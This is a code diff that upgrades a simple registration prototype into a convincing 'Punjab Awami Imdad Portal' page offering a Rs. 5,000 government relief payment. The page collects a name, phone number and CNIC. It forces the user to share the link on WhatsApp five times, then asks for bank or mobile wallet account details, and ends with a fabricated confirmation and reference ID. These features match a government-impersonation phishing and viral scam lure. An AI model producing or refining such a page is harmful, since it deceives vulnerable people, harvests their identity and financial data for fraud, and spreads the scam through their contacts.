@@ -1,77 +1,141 @@
 <!DOCTYPE html>
-<html lang="ur">
+<html lang="ur" dir="ltr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Registration Portal Prototype</title>
+    <title>Punjab Awami Imdad Portal - 5000 RS Scheme</title>
+    <!-- Tailwind CSS -->
     <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <!-- Google Fonts for Urdu & English -->
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Nastaliq+Urdu:wght@400;700&family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        .step-transition { transition: all 0.3s ease-in-out; }
+        body { font-family: 'Poppins', sans-serif; }
+        .urdu-text { font-family: 'Noto Nastaliq Urdu', serif; }
+        .fade-in { animation: fadeIn 0.4s ease-in-out forwards; }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
     </style>
 </head>
-<body class="bg-gray-100 min-h-screen flex items-center justify-center p-4 font-sans">
+<body class="bg-gradient-to-br from-emerald-600 via-teal-700 to-cyan-800 min-h-screen flex items-center justify-center p-4">
 
-    <div class="max-w-md w-full bg-white rounded-xl shadow-lg overflow-hidden border border-gray-200">
+    <div class="max-w-md w-full bg-white/95 backdrop-blur-md rounded-2xl shadow-2xl overflow-hidden border border-emerald-100 transition-all duration-300">
         
-        <!-- Header -->
-        <div class="bg-emerald-700 text-white p-5 text-center">
-            <h1 class="text-xl font-bold">Punjab Citizen Welfare Portal</h1>
-            <p class="text-xs text-emerald-100 mt-1">Imdad Scheme Registration Interface</p>
+        <!-- Header with Branding -->
+        <div class="bg-gradient-to-r from-emerald-700 to-teal-800 text-white p-6 text-center relative overflow-hidden shadow-md">
+            <div class="absolute -right-10 -bottom-10 w-32 h-32 bg-emerald-500 rounded-full opacity-20 blur-2xl"></div>
+            <div class="absolute -left-10 -top-10 w-32 h-32 bg-teal-400 rounded-full opacity-20 blur-2xl"></div>
+            
+            <h1 class="text-xl font-bold tracking-wide">Punjab Awami Imdad Portal</h1>
+            <p class="text-emerald-200 text-xs mt-1">Chief Minister Relief Package (Rs. 5,000)</p>
+            
+            <!-- Leader / Govt Emblem Placeholder -->
+            <div class="mt-4 flex justify-center items-center">
+                <div class="w-16 h-16 rounded-full border-2 border-white/80 shadow-lg overflow-hidden bg-emerald-900 flex items-center justify-center">
+                    <!-- Aap yahan official tasweer ka URL laga sakte hain -->
+                    <span class="text-2xl">🏛️</span>
+                </div>
+            </div>
         </div>
 
+        <!-- Form Body -->
         <div class="p-6">
             
-            <!-- STEP 1 -->
-            <div id="step-1" class="space-y-4">
-                <div>
-                    <label class="block text-gray-700 text-sm font-semibold mb-1">Apna Full Name likhein</label>
-                    <input type="text" id="name" placeholder="Ali Ahmed" class="w-full p-3 border border-gray-300 rounded-lg text-sm focus:ring-2 focus:ring-emerald-500 outline-none">
+            <!-- Progress Steps Indicator -->
+            <div class="flex justify-between mb-6 text-xs font-semibold text-gray-400 px-2">
+                <span id="indicator-1" class="text-emerald-600 border-b-2 border-emerald-600 pb-1">1. Registration</span>
+                <span id="indicator-2" class="pb-1">2. Share</span>
+                <span id="indicator-3" class="pb-1">3. Bank Details</span>
+            </div>
+
+            <!-- STEP 1: Registration Form -->
+            <div id="step-1" class="space-y-4 fade-in">
+                <div class="bg-emerald-50 border-l-4 border-emerald-600 p-3 text-xs text-emerald-900 rounded-r">
+                    <p class="font-bold">Hidayat:</p>
+                    <p>Apni durust maloomat darj karein taake imdad ki raqam ki muntaqili mein koi rukawat na aaye.</p>
                 </div>
+
                 <div>
-                    <label class="block text-gray-700 text-sm font-semibold mb-1">Apna Mobile Number likhein</label>
-                    <input type="tel" id="phone" placeholder="03XXXXXXXXX" class="w-full p-3 border border-gray-300 rounded-lg text-sm focus:ring-2 focus:ring-emerald-500 outline-none">
+                    <label class="block text-gray-700 text-xs font-bold mb-1 uppercase tracking-wider">Apna Full Name Likhein</label>
+                    <input type="text" id="fullName" placeholder="Misal: Muhammad Ali" class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-emerald-500 focus:outline-none text-sm bg-gray-50 transition">
                 </div>
+
                 <div>
-                    <label class="block text-gray-700 text-sm font-semibold mb-1">Apna Shanakti Card Number likhein</label>
-                    <input type="text" id="cnic" placeholder="33102-XXXXXXX-X" class="w-full p-3 border border-gray-300 rounded-lg text-sm focus:ring-2 focus:ring-emerald-500 outline-none">
+                    <label class="block text-gray-700 text-xs font-bold mb-1 uppercase tracking-wider">Apna Mobile Number Likhein</label>
+                    <input type="tel" id="phoneNumber" placeholder="03001234567" class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-emerald-500 focus:outline-none text-sm bg-gray-50 transition">
                 </div>
-                <button onclick="nextStep(2)" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3 rounded-lg shadow">
-                    Submit Karein
+
+                <div>
+                    <label class="block text-gray-700 text-xs font-bold mb-1 uppercase tracking-wider">Apna Shanakti Card Number (CNIC)</label>
+                    <input type="text" id="cnicNumber" placeholder="33102-1234567-1" maxlength="15" class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-emerald-500 focus:outline-none text-sm bg-gray-50 transition">
+                </div>
+
+                <button onclick="submitStep1()" class="w-full bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-700 hover:to-teal-700 text-white font-semibold py-3.5 rounded-xl shadow-lg shadow-emerald-600/30 transition-all transform active:scale-95 cursor-pointer mt-2 text-sm">
+                    Aagay Barhein (Submit)
                 </button>
             </div>
 
-            <!-- STEP 2 -->
-            <div id="step-2" class="hidden space-y-4 text-center">
-                <h2 class="text-lg font-bold text-gray-800">Is sahulat ko 5 doston tak share karein</h2>
-                <div class="bg-emerald-50 p-4 rounded-lg">
-                    <span class="text-sm font-semibold text-emerald-800">Progress: </span>
-                    <span id="count" class="font-bold text-emerald-600">0 / 5</span>
+            <!-- STEP 2: Real Sharing Screen -->
+            <div id="step-2" class="hidden space-y-4 text-center py-2 fade-in">
+                <div class="w-16 h-16 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto text-2xl shadow-inner animate-bounce">
+                    📤
                 </div>
-                <button onclick="addShare()" class="w-full bg-green-500 hover:bg-green-600 text-white font-bold py-3 rounded-lg shadow">
-                    Paanch bandon ko ye share karein
+                <h2 class="text-base font-bold text-gray-800">Ek Akhri Qadam Baqi Hai!</h2>
+                <p class="text-xs text-gray-600 leading-relaxed px-2">
+                    Apni darkhwast verify karwane ke liye is sahulat ko WhatsApp par <strong>5 mukhtalif doston ya groups</strong> mein share karein.
+                </p>
+
+                <div class="bg-gray-50 border border-gray-200 p-4 rounded-xl flex items-center justify-between text-sm shadow-sm">
+                    <span class="text-gray-700 font-semibold text-xs">Share Progress:</span>
+                    <span id="shareCount" class="bg-emerald-600 text-white px-3 py-1 rounded-full text-xs font-bold shadow">0 / 5</span>
+                </div>
+
+                <!-- Real WhatsApp Share Button -->
+                <button onclick="shareOnWhatsApp()" class="w-full bg-green-500 hover:bg-green-600 text-white font-semibold py-3.5 rounded-xl shadow-md transition flex items-center justify-center gap-2 cursor-pointer text-sm">
+                    <span>🟢 WhatsApp Par Share Karein</span>
+                </button>
+
+                <!-- Copy Link Option -->
+                <button onclick="copyPortalLink()" class="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 font-medium py-2.5 rounded-xl transition text-xs cursor-pointer">
+                    🔗 Link Copy Karein
                 </button>
             </div>
 
-            <!-- STEP 3 -->
-            <div id="step-3" class="hidden space-y-4">
-                <div>
-                    <label class="block text-gray-700 text-sm font-semibold mb-1">Bank ya Mobile Wallet Account Number</label>
-                    <input type="text" id="account" placeholder="Account Number" class="w-full p-3 border border-gray-300 rounded-lg text-sm focus:ring-2 focus:ring-emerald-500 outline-none">
+            <!-- STEP 3: Bank Details -->
+            <div id="step-3" class="hidden space-y-4 fade-in">
+                <div class="bg-blue-50 border-l-4 border-blue-600 p-3 text-xs text-blue-900 rounded-r">
+                    <p class="font-bold">Mubarak Ho!</p>
+                    <p>Aapki sharing ki shart mukammal ho gayi hai. Ab apni raqam muntaqil karne ke liye account details dein.</p>
                 </div>
+
                 <div>
-                    <label class="block text-gray-700 text-sm font-semibold mb-1">Bank / Wallet Ka Naam</label>
-                    <input type="text" id="bank" placeholder="EasyPaisa / JazzCash / Bank" class="w-full p-3 border border-gray-300 rounded-lg text-sm focus:ring-2 focus:ring-emerald-500 outline-none">
+                    <label class="block text-gray-700 text-xs font-bold mb-1 uppercase tracking-wider">Bank ya Mobile Wallet Account Number</label>
+                    <input type="text" id="bankAccount" placeholder="EasyPaisa / JazzCash / Bank A/C" class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-emerald-500 focus:outline-none text-sm bg-gray-50 transition">
                 </div>
-                <button onclick="nextStep(4)" class="w-full bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3 rounded-lg shadow">
-                    Confirm Bank Details
+
+                <div>
+                    <label class="block text-gray-700 text-xs font-bold mb-1 uppercase tracking-wider">Account Title / Bank Ka Naam</label>
+                    <input type="text" id="bankName" placeholder="Misal: HBL / UBL / EasyPaisa" class="w-full px-4 py-3 rounded-xl border border-gray-200 focus:ring-2 focus:ring-emerald-500 focus:outline-none text-sm bg-gray-50 transition">
+                </div>
+
+                <button onclick="submitBankDetails()" class="w-full bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-700 hover:to-teal-700 text-white font-semibold py-3.5 rounded-xl shadow-lg shadow-emerald-600/30 transition-all transform active:scale-95 cursor-pointer mt-2 text-sm">
+                    Raqam Ke Liye Apply Karein
                 </button>
             </div>
 
-            <!-- STEP 4 -->
-            <div id="step-4" class="hidden text-center space-y-3 py-4">
-                <div class="w-16 h-16 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto text-2xl font-bold">✓</div>
-                <h3 class="text-lg font-bold text-gray-800">Aapki darkhwast jama ho chuki hai!</h3>
-                <p class="text-sm text-gray-600">Aapko jald 1 se 2 din ke andar paise muntaqil kar diye jayenge.</p>
+            <!-- STEP 4: Success Message -->
+            <div id="step-4" class="hidden text-center py-6 space-y-4 fade-in">
+                <div class="w-20 h-20 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto text-4xl shadow-inner">
+                    ✓
+                </div>
+                <h2 class="text-lg font-bold text-gray-800">Darkhwast Mohfooz Ho Gayi!</h2>
+                <p class="text-xs text-gray-600 leading-relaxed px-2">
+                    Aap ki darkhwast kaamyabi se jama ho chuki hai. Verifications ke baad aapke diye gaye number par **1 ya 2 din ke andar** 5,000 rupaye muntaqil kar diye jayenge.
+                </p>
+                <div class="p-3 bg-yellow-50 border border-yellow-200 rounded-xl text-[11px] text-yellow-800 font-mono">
+                    Ref ID: #PK-5000-FS-2026-REG
+                </div>
             </div>
 
         </div>
@@ -80,19 +144,78 @@
     <script>
         let shares = 0;
 
-        function nextStep(step) {
-            document.querySelectorAll('[id^="step-"]').forEach(el => el.classList.add('hidden'));
-            document.getElementById(`step-${step}`).classList.remove('hidden');
+        function submitStep1() {
+            const name = document.getElementById('fullName').value.trim();
+            const phone = document.getElementById('phoneNumber').value.trim();
+            const cnic = document.getElementById('cnicNumber').value.trim();
+
+            if (!name || !phone || !cnic) {
+                alert('Meherbani karke tamam khali jagah pur karein.');
+                return;
+            }
+
+            document.getElementById('step-1').classList.add('hidden');
+            document.getElementById('step-2').classList.remove('hidden');
+            document.getElementById('indicator-1').className = "pb-1 text-gray-400";
+            document.getElementById('indicator-2').className = "text-emerald-600 border-b-2 border-emerald-600 pb-1";
         }
 
-        function addShare() {
+        function shareOnWhatsApp() {
+            // Real WhatsApp share API integration
+            const shareText = encodeURIComponent("Punjab Government 5000 Rs Imdad Scheme ke liye yahan register karein: " + window.location.href);
+            const whatsappUrl = `https://api.whatsapp.com/send?text=${shareText}`;
+            
+            // Open WhatsApp share window
+            window.open(whatsappUrl, '_blank');
+
+            // Increment share counter automatically on click
             if (shares < 5) {
                 shares++;
-                document.getElementById('count').innerText = `${shares} / 5`;
+                document.getElementById('shareCount').innerText = `${shares} / 5`;
+                
                 if (shares === 5) {
-                    setTimeout(() => nextStep(3), 500);
+                    setTimeout(() => {
+                        alert('Aapka share goal mukammal ho gaya hai! Ab bank details darj karein.');
+                        document.getElementById('step-2').classList.add('hidden');
+                        document.getElementById('step-3').classList.remove('hidden');
+                        document.getElementById('indicator-2').className = "pb-1 text-gray-400";
+                        document.getElementById('indicator-3').className = "text-emerald-600 border-b-2 border-emerald-600 pb-1";
+                    }, 1000);
                 }
             }
+        }
+
+        function copyPortalLink() {
+            navigator.clipboard.writeText(window.location.href);
+            alert('Portal ka link copy ho gaya hai! Ab isay doston ko paste karein.');
+            
+            // Count a share when link is copied as well
+            if (shares < 5) {
+                shares++;
+                document.getElementById('shareCount').innerText = `${shares} / 5`;
+                if (shares === 5) {
+                    setTimeout(() => {
+                        document.getElementById('step-2').classList.add('hidden');
+                        document.getElementById('step-3').classList.remove('hidden');
+                        document.getElementById('indicator-2').className = "pb-1 text-gray-400";
+                        document.getElementById('indicator-3').className = "text-emerald-600 border-b-2 border-emerald-600 pb-1";
+                    }, 1000);
+                }
+            }
+        }
+
+        function submitBankDetails() {
+            const account = document.getElementById('bankAccount').value.trim();
+            const bank = document.getElementById('bankName').value.trim();
+
+            if (!account || !bank) {
+                alert('Meherbani karke apni bank ya wallet details darj karein.');
+                return;
+            }
+
+            document.getElementById('step-3').classList.add('hidden');
+            document.getElementById('step-4').classList.remove('hidden');
+            document.getElementById('indicator-3').className = "pb-1 text-gray-400";
         }
     </script>
 </body>
